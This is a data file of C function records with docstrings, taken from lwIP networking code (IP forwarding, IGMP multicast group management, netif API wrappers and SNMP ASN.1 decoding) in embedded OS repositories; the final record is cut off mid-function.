{"docstring": "/**\n * Forwards an IP packet. It finds an appropriate route for the\n * packet, decrements the TTL value of the packet, adjusts the\n * checksum and outputs the packet on the appropriate interface.\n *\n * @param p the packet to forward (p->payload points to IP header)\n * @param iphdr the IP header of the input packet\n * @param inp the netif on which this packet was received\n * @return the netif on which the packet was sent (NULL if it wasn't sent)\n */\n", "func_signal": "static struct netif *\nip_forward(struct pbuf *p, struct ip_hdr *iphdr, struct netif *inp)", "code": "{\n  struct netif *netif;\n\n  PERF_START;\n  /* Find network interface where to forward this IP packet to. */\n  netif = ip_route((struct ip_addr *)&(iphdr->dest));\n  if (netif == NULL) {\n    LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: no forwarding route for 0x%\"X32_F\" found\\n\",\n                      iphdr->dest.addr));\n    snmp_inc_ipoutnoroutes();\n    return (struct netif *)NULL;\n  }\n  /* Do not forward packets onto the same network interface on which\n   * they arrived. */\n  if (netif == inp) {\n    LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: not bouncing packets back on incoming interface.\\n\"));\n    snmp_inc_ipoutnoroutes();\n    return (struct netif *)NULL;\n  }\n\n  /* decrement TTL */\n  IPH_TTL_SET(iphdr, IPH_TTL(iphdr) - 1);\n  /* send ICMP if TTL == 0 */\n  if (IPH_TTL(iphdr) == 0) {\n    snmp_inc_ipinhdrerrors();\n#if LWIP_ICMP\n    /* Don't send ICMP messages in response to ICMP messages */\n    if (IPH_PROTO(iphdr) != IP_PROTO_ICMP) {\n      icmp_time_exceeded(p, ICMP_TE_TTL);\n    }\n#endif /* LWIP_ICMP */\n    return (struct netif *)NULL;\n  }\n\n  /* Incrementally update the IP checksum. */\n  if (IPH_CHKSUM(iphdr) >= htons(0xffff - 0x100)) {\n    IPH_CHKSUM_SET(iphdr, IPH_CHKSUM(iphdr) + htons(0x100) + 1);\n  } else {\n    IPH_CHKSUM_SET(iphdr, IPH_CHKSUM(iphdr) + htons(0x100));\n  }\n\n  LWIP_DEBUGF(IP_DEBUG, (\"ip_forward: forwarding packet to 0x%\"X32_F\"\\n\",\n                    iphdr->dest.addr));\n\n  IP_STATS_INC(ip.fw);\n  IP_STATS_INC(ip.xmit);\n  snmp_inc_ipforwdatagrams();\n\n  PERF_STOP(\"ip_forward\");\n  /* transmit pbuf on chosen interface */\n  netif->output(netif, p, (struct ip_addr *)&(iphdr->dest));\n  return netif;\n}", "path": "FreeRTOS\\Demo\\Common\\ethernet\\lwIP_130\\src\\core\\ipv4\\ip.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "void vRegisterFileSystemCLICommands( void )", "code": "{\n\t/* Register all the command line commands defined immediately above. */\n\tFreeRTOS_CLIRegisterCommand( &xDIR );\n\tFreeRTOS_CLIRegisterCommand( &xCD );\n\tFreeRTOS_CLIRegisterCommand( &xTYPE );\n\tFreeRTOS_CLIRegisterCommand( &xDEL );\n\tFreeRTOS_CLIRegisterCommand( &xCOPY );\n}", "path": "FreeRTOS\\Demo\\CORTEX_A9_RZ_R7S72100_IAR_DS-5\\Source\\Full-Demo\\File-releated-CLI-commands.c", "repo_name": "DuinOS/FreeRTOS", "stars": 63, "license": "None", "language": "c", "size": 53981}
{"docstring": "/**\n * Start IGMP processing on interface\n *\n * @param netif network interface on which start IGMP processing\n */\n", "func_signal": "err_t\nigmp_start(struct netif *netif)", "code": "{\n  struct igmp_group* group;\n\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_start: starting IGMP processing on if %x\\n\", (int) netif));\n\n  group = igmp_lookup_group(netif, &allsystems);\n\n  if (group != NULL) {\n    group->group_state = IGMP_GROUP_IDLE_MEMBER;\n    group->use++;\n\n    /* Allow the igmp messages at the MAC level */\n    if (netif->igmp_mac_filter != NULL) {\n      LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_start: igmp_mac_filter(ADD \"));\n      ip_addr_debug_print(IGMP_DEBUG, &allsystems);\n      LWIP_DEBUGF(IGMP_DEBUG, (\") on if %x\\n\", (int) netif));\n      netif->igmp_mac_filter( netif, &allsystems, IGMP_ADD_MAC_FILTER);\n    }\n\n    return ERR_OK;\n  }\n\n  return ERR_MEM;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Call netif_add() in a thread-safe way by running that function inside the\n * tcpip_thread context.\n *\n * @note for params @see netif_add()\n */\n", "func_signal": "err_t\nnetifapi_netif_add(struct netif *netif,\n                   struct ip_addr *ipaddr,\n                   struct ip_addr *netmask,\n                   struct ip_addr *gw,\n                   void *state,\n                   err_t (* init)(struct netif *netif),\n                   err_t (* input)(struct pbuf *p, struct netif *netif))", "code": "{\n  struct netifapi_msg msg;\n  msg.function = do_netifapi_netif_add;\n  msg.msg.netif = netif;\n  msg.msg.msg.add.ipaddr  = ipaddr;\n  msg.msg.msg.add.netmask = netmask;\n  msg.msg.msg.add.gw      = gw;\n  msg.msg.msg.add.state   = state;\n  msg.msg.msg.add.init    = init;\n  msg.msg.msg.add.input   = input;\n  TCPIP_NETIFAPI(&msg);\n  return msg.msg.err;\n}", "path": "net\\lwip\\api\\netifapi.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Call the \"errtfunc\" (or the \"voidfunc\" if \"errtfunc\" is NULL) inside the\n * tcpip_thread context.\n */\n", "func_signal": "void\ndo_netifapi_netif_common( struct netifapi_msg_msg *msg)", "code": "{\n  if (msg->msg.common.errtfunc!=NULL) {\n    msg->err =\n    msg->msg.common.errtfunc(msg->netif);\n  } else {\n    msg->err = ERR_OK;\n    msg->msg.common.voidfunc(msg->netif);\n  }\n  TCPIP_NETIFAPI_ACK(msg);\n}", "path": "net\\lwip\\api\\netifapi.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Initialize the IGMP module\n */\n", "func_signal": "void\nigmp_init(void)", "code": "{\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_init: initializing\\n\"));\n\n  IP4_ADDR(&allsystems, 224, 0, 0, 1);\n  IP4_ADDR(&allrouters, 224, 0, 0, 2);\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Call netif_add() inside the tcpip_thread context.\n */\n", "func_signal": "void\ndo_netifapi_netif_add( struct netifapi_msg_msg *msg)", "code": "{\n  if (!netif_add( msg->netif,\n                  msg->msg.add.ipaddr,\n                  msg->msg.add.netmask,\n                  msg->msg.add.gw,\n                  msg->msg.add.state,\n                  msg->msg.add.init,\n                  msg->msg.add.input)) {\n    msg->err = ERR_IF;\n  } else {\n    msg->err = ERR_OK;\n  }\n  TCPIP_NETIFAPI_ACK(msg);\n}", "path": "net\\lwip\\api\\netifapi.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Search for a group in the global igmp_group_list\n *\n * @param ifp the network interface for which to look\n * @param addr the group ip address to search for\n * @return a struct igmp_group* if the group has been found,\n *         NULL if the group wasn't found.\n */\n", "func_signal": "struct igmp_group *\nigmp_lookfor_group(struct netif *ifp, struct ip_addr *addr)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n\n  while (group != NULL) {\n    if ((group->interface == ifp) && (ip_addr_cmp(&(group->group_address), addr))) {\n      return group;\n    }\n    group = group->next;\n  }\n\n  /* to be clearer, we return NULL here instead of\n   * 'group' (which is also NULL at this point).\n   */\n  return NULL;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Retrieves type field from incoming pbuf chain.\n *\n * @param p points to a pbuf holding an ASN1 coded type field\n * @param ofs points to the offset within the pbuf chain of the ASN1 coded type field\n * @param type return ASN1 type\n * @return ERR_OK if successfull, ERR_ARG if we can't (or won't) decode\n */\n", "func_signal": "err_t\nsnmp_asn1_dec_type(struct pbuf *p, u16_t ofs, u8_t *type)", "code": "{\n  u16_t plen, base;\n  u8_t *msg_ptr;\n\n  plen = 0;\n  while (p != NULL)\n  {\n    base = plen;\n    plen += p->len;\n    if (ofs < plen)\n    {\n      msg_ptr = p->payload;\n      msg_ptr += ofs - base;\n      *type = *msg_ptr;\n      return ERR_OK;\n    }\n    p = p->next;\n  }\n  /* p == NULL, ofs >= plen */\n  return ERR_ARG;\n}", "path": "net\\lwip\\core\\snmp\\asn1_dec.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Send an igmp packet to a specific group.\n *\n * @param group the group to which to send the packet\n * @param type the type of igmp packet to send\n */\n", "func_signal": "void\nigmp_send(struct igmp_group *group, u8_t type)", "code": "{\n  struct pbuf*     p    = NULL;\n  struct igmp_msg* igmp = NULL;\n  struct ip_addr   src  = {0};\n  struct ip_addr*  dest = NULL;\n\n  /* IP header + \"router alert\" option + IGMP header */\n  p = pbuf_alloc(PBUF_TRANSPORT, IGMP_MINLEN, PBUF_RAM);\n  \n  if (p) {\n    igmp = p->payload;\n    LWIP_ASSERT(\"igmp_send: check that first pbuf can hold struct igmp_msg\",\n               (p->len >= sizeof(struct igmp_msg)));\n    ip_addr_set(&src, &((group->interface)->ip_addr));\n     \n    if (type == IGMP_V2_MEMB_REPORT) {\n      dest = &(group->group_address);\n      IGMP_STATS_INC(igmp.report_sent);\n      ip_addr_set(&(igmp->igmp_group_address), &(group->group_address));\n      group->last_reporter_flag = 1; /* Remember we were the last to report */\n    } else {\n      if (type == IGMP_LEAVE_GROUP) {\n        dest = &allrouters;\n        ip_addr_set(&(igmp->igmp_group_address), &(group->group_address));\n      }\n    }\n\n    if ((type == IGMP_V2_MEMB_REPORT) || (type == IGMP_LEAVE_GROUP)) {\n      igmp->igmp_msgtype  = type;\n      igmp->igmp_maxresp  = 0;\n      igmp->igmp_checksum = 0;\n      igmp->igmp_checksum = inet_chksum( igmp, IGMP_MINLEN);\n\n      igmp_ip_output_if( p, &src, dest, IGMP_TTL, IP_PROTO_IGMP, group->interface);\n    }\n\n    pbuf_free (p);\n  } else {\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_send: not enough memory for igmp_send\\n\"));\n  }\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Called from ip_input() if a new IGMP packet is received.\n *\n * @param p received igmp packet, p->payload pointing to the ip header\n * @param inp network interface on which the packet was received\n * @param dest destination ip address of the igmp packet\n */\n", "func_signal": "void\nigmp_input(struct pbuf *p, struct netif *inp, struct ip_addr *dest)", "code": "{\n  struct ip_hdr *    iphdr;\n  struct igmp_msg*   igmp;\n  struct igmp_group* group;\n  struct igmp_group* groupref;\n\n  /* Note that the length CAN be greater than 8 but only 8 are used - All are included in the checksum */    \n  iphdr = p->payload;\n  if (pbuf_header(p, -(s16_t)(IPH_HL(iphdr) * 4)) || (p->len < IGMP_MINLEN)) {\n    pbuf_free(p);\n    IGMP_STATS_INC(igmp.lenerr);\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: length error\\n\"));\n    return;\n  }\n\n  LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: message from \"));\n  ip_addr_debug_print(IGMP_DEBUG, &(iphdr->src));\n  LWIP_DEBUGF(IGMP_DEBUG, (\" to address \"));\n  ip_addr_debug_print(IGMP_DEBUG, &(iphdr->dest));\n  LWIP_DEBUGF(IGMP_DEBUG, (\" on if %x\\n\", (int) inp));\n\n  /* Now calculate and check the checksum */\n  igmp = (struct igmp_msg *)p->payload;\n  if (inet_chksum(igmp, p->len)) {\n    pbuf_free(p);\n    IGMP_STATS_INC(igmp.chkerr);\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: checksum error\\n\"));\n    return;\n  }\n\n  /* Packet is ok so find an existing group */\n  group = igmp_lookfor_group(inp, dest); /* use the incoming IP address! */\n  \n  /* If group can be found or create... */\n  if (!group) {\n    pbuf_free(p);\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: IGMP frame not for us\\n\"));\n    return;\n  }\n\n  /* NOW ACT ON THE INCOMING MESSAGE TYPE... */\n  switch (igmp->igmp_msgtype) {\n   case IGMP_MEMB_QUERY: {\n     /* IGMP_MEMB_QUERY to the \"all systems\" address ? */\n     if ((ip_addr_cmp(dest, &allsystems)) && (igmp->igmp_group_address.addr == 0)) {\n       /* THIS IS THE GENERAL QUERY */\n       LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: General IGMP_MEMB_QUERY on \\\"ALL SYSTEMS\\\" address (224.0.0.1) [igmp_maxresp=%i]\\n\", (int)(igmp->igmp_maxresp)));\n\n       if (igmp->igmp_maxresp == 0) {\n         IGMP_STATS_INC(igmp.v1_rxed);\n         LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: got an all hosts query with time== 0 - this is V1 and not implemented - treat as v2\\n\"));\n         igmp->igmp_maxresp = IGMP_V1_DELAYING_MEMBER_TMR;\n       }\n\n       IGMP_STATS_INC(igmp.group_query_rxed);\n       groupref = igmp_group_list;\n       while (groupref) {\n         /* Do not send messages on the all systems group address! */\n         if ((groupref->interface == inp) && (!(ip_addr_cmp(&(groupref->group_address), &allsystems)))) {\n           igmp_delaying_member( groupref, igmp->igmp_maxresp);\n         }\n         groupref = groupref->next;\n       }\n     } else {\n       /* IGMP_MEMB_QUERY to a specific group ? */\n       if (group->group_address.addr != 0) {\n         LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: IGMP_MEMB_QUERY to a specific group \"));\n         ip_addr_debug_print(IGMP_DEBUG, &group->group_address);\n         if (ip_addr_cmp (dest, &allsystems)) {\n           LWIP_DEBUGF(IGMP_DEBUG, (\" using \\\"ALL SYSTEMS\\\" address (224.0.0.1) [igmp_maxresp=%i]\\n\", (int)(igmp->igmp_maxresp)));\n           /* we first need to re-lookfor the group since we used dest last time */\n           group = igmp_lookfor_group(inp, &igmp->igmp_group_address);\n         } else {\n           LWIP_DEBUGF(IGMP_DEBUG, (\" with the group address as destination [igmp_maxresp=%i]\\n\", (int)(igmp->igmp_maxresp)));\n         }\n\n         if (group != NULL) {\n           IGMP_STATS_INC(igmp.unicast_query);\n           igmp_delaying_member( group, igmp->igmp_maxresp);\n         }\n       }\n     }\n     break;\n   }\n   case IGMP_V2_MEMB_REPORT: {\n     LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: IGMP_V2_MEMB_REPORT\\n\"));\n\n     IGMP_STATS_INC(igmp.report_rxed);\n     if (group->group_state == IGMP_GROUP_DELAYING_MEMBER) {\n       /* This is on a specific group we have already looked up */\n       group->timer = 0; /* stopped */\n       group->group_state = IGMP_GROUP_IDLE_MEMBER;\n       group->last_reporter_flag = 0;\n     }\n     break;\n   }\n   default: {\n     LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_input: unexpected msg %x in state %x on group %x on if %x\\n\", (int) igmp->igmp_msgtype, (int) group->group_state, (int) &group, (int) group->interface));\n     break;\n   }\n  }\n\n  pbuf_free(p);\n  return;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Leave a group on one network interface.\n *\n * @param ifaddr ip address of the network interface which should leave a group\n * @param groupaddr the ip address of the group which to leave\n * @return ERR_OK if group was left on the netif(s), an err_t otherwise\n */\n", "func_signal": "err_t\nigmp_leavegroup(struct ip_addr *ifaddr, struct ip_addr *groupaddr)", "code": "{\n  err_t              err = ERR_VAL; /* no matching interface */\n  struct igmp_group *group;\n  struct netif      *netif;\n\n  /* make sure it is multicast address */\n  LWIP_ERROR(\"igmp_leavegroup: attempt to leave non-multicast address\", ip_addr_ismulticast(groupaddr), return ERR_VAL;);\n  LWIP_ERROR(\"igmp_leavegroup: attempt to leave allsystems address\", (!ip_addr_cmp(groupaddr, &allsystems)), return ERR_VAL;);\n\n  /* loop through netif's */\n  netif = netif_list;\n  while (netif != NULL) {\n    /* Should we leave this interface ? */\n    if ((netif->flags & NETIF_FLAG_IGMP) && ((ip_addr_isany(ifaddr) || ip_addr_cmp(&(netif->ip_addr), ifaddr)))) {\n      /* find group */\n      group = igmp_lookfor_group(netif, groupaddr);\n\n      if (group != NULL) {\n        /* Only send a leave if the flag is set according to the state diagram */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: Leaving group: \"));\n        ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n        LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));\n\n        /* If there is no other use of the group */\n        if (group->use <= 1) {\n          /* If we are the last reporter for this group */\n          if (group->last_reporter_flag) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: sending leaving group\\n\"));\n            IGMP_STATS_INC(igmp.leave_sent);\n            igmp_send(group, IGMP_LEAVE_GROUP);\n          }\n          \n          /* Disable the group at the MAC level */\n          if (netif->igmp_mac_filter != NULL) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: igmp_mac_filter(DEL \"));\n            ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n            LWIP_DEBUGF(IGMP_DEBUG, (\") on if %x\\n\", (int) netif));\n            netif->igmp_mac_filter(netif, groupaddr, IGMP_DEL_MAC_FILTER);\n          }\n          \n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: remove group: \"));\n          ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n          LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));          \n          \n          /* Free the group */\n          igmp_remove_group(group);\n        } else {\n          /* Decrement group use */\n          group->use--;\n        }\n        /* Leave on this interface */\n        err = ERR_OK;\n      } else {\n        /* It's not a fatal error on \"leavegroup\" */\n        LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_leavegroup: not member of group\\n\"));\n      }\n    }\n    /* proceed to next network interface */\n    netif = netif->next;\n  }\n\n  return err;\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Decodes positive integer (counter, gauge, timeticks) into u32_t.\n *\n * @param p points to a pbuf holding an ASN1 coded integer\n * @param ofs points to the offset within the pbuf chain of the ASN1 coded integer\n * @param len length of the coded integer field\n * @param value return host order integer\n * @return ERR_OK if successfull, ERR_ARG if we can't (or won't) decode\n *\n * @note ASN coded integers are _always_ signed. E.g. +0xFFFF is coded\n * as 0x00,0xFF,0xFF. Note the leading sign octet. A positive value\n * of 0xFFFFFFFF is preceded with 0x00 and the length is 5 octets!!\n */\n", "func_signal": "err_t\nsnmp_asn1_dec_u32t(struct pbuf *p, u16_t ofs, u16_t len, u32_t *value)", "code": "{\n  u16_t plen, base;\n  u8_t *msg_ptr;\n\n  plen = 0;\n  while (p != NULL)\n  {\n    base = plen;\n    plen += p->len;\n    if (ofs < plen)\n    {\n      msg_ptr = p->payload;\n      msg_ptr += ofs - base;\n      if ((len > 0) && (len < 6))\n      {\n        /* start from zero */\n        *value = 0;\n        if (*msg_ptr & 0x80)\n        {\n          /* negative, expecting zero sign bit! */\n          return ERR_ARG;\n        }\n        else\n        {\n          /* positive */\n          if ((len > 1) && (*msg_ptr == 0))\n          {\n            /* skip leading \"sign byte\" octet 0x00 */\n            len--;\n            ofs += 1;\n            if (ofs >= plen)\n            {\n              /* next octet in next pbuf */\n              p = p->next;\n              if (p == NULL) { return ERR_ARG; }\n              msg_ptr = p->payload;\n              plen += p->len;\n            }\n            else\n            {\n              /* next octet in same pbuf */\n              msg_ptr++;\n            }\n          }\n        }\n        /* OR octets with value */\n        while (len > 1)\n        {\n          len--;\n          *value |= *msg_ptr;\n          *value <<= 8;\n          ofs += 1;\n          if (ofs >= plen)\n          {\n            /* next octet in next pbuf */\n            p = p->next;\n            if (p == NULL) { return ERR_ARG; }\n            msg_ptr = p->payload;\n            plen += p->len;\n          }\n          else\n          {\n            /* next octet in same pbuf */\n            msg_ptr++;\n          }\n        }\n        *value |= *msg_ptr;\n        return ERR_OK;\n      }\n      else\n      {\n        return ERR_ARG;\n      }\n    }\n    p = p->next;\n  }\n  /* p == NULL, ofs >= plen */\n  return ERR_ARG;\n}", "path": "net\\lwip\\core\\snmp\\asn1_dec.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Delaying membership report for a group if necessary\n *\n * @param group the igmp_group for which \"delaying\" membership report\n * @param maxresp query delay\n */\n", "func_signal": "void\nigmp_delaying_member( struct igmp_group *group, u8_t maxresp)", "code": "{\n  if ((group->group_state == IGMP_GROUP_IDLE_MEMBER) || ((group->group_state == IGMP_GROUP_DELAYING_MEMBER) && (maxresp > group->timer))) {\n    igmp_start_timer(group, (maxresp)/2);\n    group->group_state = IGMP_GROUP_DELAYING_MEMBER;\n  }\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Decodes (copies) raw data (ip-addresses, octet strings, opaque encoding)\n * from incoming message into array.\n *\n * @param p points to a pbuf holding an ASN1 coded raw data\n * @param ofs points to the offset within the pbuf chain of the ASN1 coded raw data\n * @param len length of the coded raw data (zero is valid, e.g. empty string!)\n * @param raw_len length of the raw return value\n * @param raw return raw bytes\n * @return ERR_OK if successfull, ERR_ARG if we can't (or won't) decode\n */\n", "func_signal": "err_t\nsnmp_asn1_dec_raw(struct pbuf *p, u16_t ofs, u16_t len, u16_t raw_len, u8_t *raw)", "code": "{\n  u16_t plen, base;\n  u8_t *msg_ptr;\n\n  if (len > 0)\n  {\n    plen = 0;\n    while (p != NULL)\n    {\n      base = plen;\n      plen += p->len;\n      if (ofs < plen)\n      {\n        msg_ptr = p->payload;\n        msg_ptr += ofs - base;\n        if (raw_len >= len)\n        {\n          while (len > 1)\n          {\n            /* copy len - 1 octets */\n            len--;\n            *raw = *msg_ptr;\n            raw++;\n            ofs += 1;\n            if (ofs >= plen)\n            {\n              /* next octet in next pbuf */\n              p = p->next;\n              if (p == NULL) { return ERR_ARG; }\n              msg_ptr = p->payload;\n              plen += p->len;\n            }\n            else\n            {\n              /* next octet in same pbuf */\n              msg_ptr++;\n            }\n          }\n          /* copy last octet */\n          *raw = *msg_ptr;\n          return ERR_OK;\n        }\n        else\n        {\n          /* raw_len < len, not enough dst space */\n          return ERR_ARG;\n        }\n      }\n      p = p->next;\n    }\n    /* p == NULL, ofs >= plen */\n    return ERR_ARG;\n  }\n  else\n  {\n    /* len == 0, empty string */\n    return ERR_OK;\n  }\n}", "path": "net\\lwip\\core\\snmp\\asn1_dec.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Decodes length field from incoming pbuf chain into host length.\n *\n * @param p points to a pbuf holding an ASN1 coded length\n * @param ofs points to the offset within the pbuf chain of the ASN1 coded length\n * @param octets_used returns number of octets used by the length code\n * @param length return host order length, upto 64k\n * @return ERR_OK if successfull, ERR_ARG if we can't (or won't) decode\n */\n", "func_signal": "err_t\nsnmp_asn1_dec_length(struct pbuf *p, u16_t ofs, u8_t *octets_used, u16_t *length)", "code": "{\n  u16_t plen, base;\n  u8_t *msg_ptr;\n\n  plen = 0;\n  while (p != NULL)\n  {\n    base = plen;\n    plen += p->len;\n    if (ofs < plen)\n    {\n      msg_ptr = p->payload;\n      msg_ptr += ofs - base;\n\n      if (*msg_ptr < 0x80)\n      {\n        /* primitive definite length format */\n        *octets_used = 1;\n        *length = *msg_ptr;\n        return ERR_OK;\n      }\n      else if (*msg_ptr == 0x80)\n      {\n        /* constructed indefinite length format, termination with two zero octets */\n        u8_t zeros;\n        u8_t i;\n\n        *length = 0;\n        zeros = 0;\n        while (zeros != 2)\n        {\n          i = 2;\n          while (i > 0)\n          {\n            i--;\n            (*length) += 1;\n            ofs += 1;\n            if (ofs >= plen)\n            {\n              /* next octet in next pbuf */\n              p = p->next;\n              if (p == NULL) { return ERR_ARG; }\n              msg_ptr = p->payload;\n              plen += p->len;\n            }\n            else\n            {\n              /* next octet in same pbuf */\n              msg_ptr++;\n            }\n            if (*msg_ptr == 0)\n            {\n              zeros++;\n              if (zeros == 2)\n              {\n                /* stop while (i > 0) */\n                i = 0;\n              }\n            }\n            else\n            {\n              zeros = 0;\n            }\n          }\n        }\n        *octets_used = 1;\n        return ERR_OK;\n      }\n      else if (*msg_ptr == 0x81)\n      {\n        /* constructed definite length format, one octet */\n        ofs += 1;\n        if (ofs >= plen)\n        {\n          /* next octet in next pbuf */\n          p = p->next;\n          if (p == NULL) { return ERR_ARG; }\n          msg_ptr = p->payload;\n        }\n        else\n        {\n          /* next octet in same pbuf */\n          msg_ptr++;\n        }\n        *length = *msg_ptr;\n        *octets_used = 2;\n        return ERR_OK;\n      }\n      else if (*msg_ptr == 0x82)\n      {\n        u8_t i;\n\n        /* constructed definite length format, two octets */\n        i = 2;\n        while (i > 0)\n        {\n          i--;\n          ofs += 1;\n          if (ofs >= plen)\n          {\n            /* next octet in next pbuf */\n            p = p->next;\n            if (p == NULL) { return ERR_ARG; }\n            msg_ptr = p->payload;\n            plen += p->len;\n          }\n          else\n          {\n            /* next octet in same pbuf */\n            msg_ptr++;\n          }\n          if (i == 0)\n          {\n            /* least significant length octet */\n            *length |= *msg_ptr;\n          }\n          else\n          {\n            /* most significant length octet */\n            *length = (*msg_ptr) << 8;\n          }\n        }\n        *octets_used = 3;\n        return ERR_OK;\n      }\n      else\n      {\n        /* constructed definite length format 3..127 octets, this is too big (>64k) */\n        /**  @todo: do we need to accept inefficient codings with many leading zero's? */\n        *octets_used = 1 + ((*msg_ptr) & 0x7f);\n        return ERR_ARG;\n      }\n    }\n    p = p->next;\n  }\n\n  /* p == NULL, ofs >= plen */\n  return ERR_ARG;\n}", "path": "net\\lwip\\core\\snmp\\asn1_dec.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Called if a timeout for one group is reached.\n * Sends a report for this group.\n *\n * @param group an igmp_group for which a timeout is reached\n */\n", "func_signal": "void\nigmp_timeout(struct igmp_group *group)", "code": "{\n  /* If the state is IGMP_GROUP_DELAYING_MEMBER then we send a report for this group */\n  if (group->group_state == IGMP_GROUP_DELAYING_MEMBER) {\n    LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_timeout: report membership for group with address \"));\n    ip_addr_debug_print(IGMP_DEBUG, &(group->group_address));\n    LWIP_DEBUGF(IGMP_DEBUG, (\" on if %x\\n\", (int) group->interface));\n\n    igmp_send(group, IGMP_V2_MEMB_REPORT);\n  }\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * The igmp timer function (both for NO_SYS=1 and =0)\n * Should be called every IGMP_TMR_INTERVAL milliseconds (100 ms is default).\n */\n", "func_signal": "void\nigmp_tmr(void)", "code": "{\n  struct igmp_group *group = igmp_group_list;\n\n  while (group != NULL) {\n    if (group->timer != 0) {\n      group->timer -= 1;\n      if (group->timer == 0) {\n        igmp_timeout(group);\n      }\n    }\n    group = group->next;\n  }\n}", "path": "net\\lwip\\core\\ipv4\\igmp.c", "repo_name": "wh5a/jos", "stars": 43, "license": "None", "language": "c", "size": 1084}
{"docstring": "/**\n * Join a group on one network interface.\n *\n * @param ifaddr ip address of the network interface which should join a new group\n * @param groupaddr the ip address of the group which to join\n * @return ERR_OK if group was joined on the netif(s), an err_t otherwise\n */\n", "func_signal": "err_t\nigmp_joingroup(struct ip_addr *ifaddr, struct ip_addr *groupaddr)", "code": "{\n  err_t              err = ERR_VAL; /* no matching interface */\n  struct igmp_group *group;\n  struct netif      *netif;\n\n  /* make sure it is multicast address */\n  LWIP_ERROR(\"igmp_joingroup: attempt to join non-multicast address\", ip_addr_ismulticast(groupaddr), return ERR_VAL;);\n  LWIP_ERROR(\"igmp_joingroup: attempt to join allsystems address\", (!ip_addr_cmp(groupaddr, &allsystems)), return ERR_VAL;);\n\n  /* loop through netif's */\n  netif = netif_list;\n  while (netif != NULL) {\n    /* Should we join this interface ? */\n    if ((netif->flags & NETIF_FLAG_IGMP) && ((ip_addr_isany(ifaddr) || ip_addr_cmp(&(netif->ip_addr), ifaddr)))) {\n      /* find group or create a new one if not found */\n      group = igmp_lookup_group(netif, groupaddr);\n\n      if (group != NULL) {\n        /* This should create a new group, check the state to make sure */\n        if (group->group_state != IGMP_GROUP_NON_MEMBER) {\n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: join to group not in state IGMP_GROUP_NON_MEMBER\\n\"));\n        } else {\n          /* OK - it was new group */\n          LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: join to new group: \"));\n          ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n          LWIP_DEBUGF(IGMP_DEBUG, (\"\\n\"));\n\n          /* If first use of the group, allow the group at the MAC level */\n          if ((group->use==0) && (netif->igmp_mac_filter != NULL)) {\n            LWIP_DEBUGF(IGMP_DEBUG, (\"igmp_joingroup: igmp_mac_filter(ADD \"));\n            ip_addr_debug_print(IGMP_DEBUG, groupaddr);\n            LWIP_DEBUGF(IGMP_DEBUG, (\") on if %x\\n\", (int) netif));\n            netif->igmp_mac_filter(netif, groupaddr, 